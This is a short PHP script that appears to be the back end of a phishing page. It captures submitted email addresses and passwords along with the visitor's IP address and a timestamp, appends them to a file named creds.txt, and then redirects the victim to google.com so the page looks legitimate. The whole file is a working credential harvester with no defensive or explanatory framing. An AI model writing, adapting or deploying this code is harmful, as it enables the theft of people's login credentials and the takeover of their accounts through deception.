<?php
// Simple logger - appends to creds.txt
$logfile = 'creds.txt';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'] ?? 'N/A';
$pass = $_POST['pass'] ?? 'N/A';

$line = "$timestamp | IP: $ip | Email: $email | Pass: $pass\n";

file_put_contents($logfile, $line, FILE_APPEND);

// Redirect to look legit
header("Location: https://www.google.com");
exit;
?>
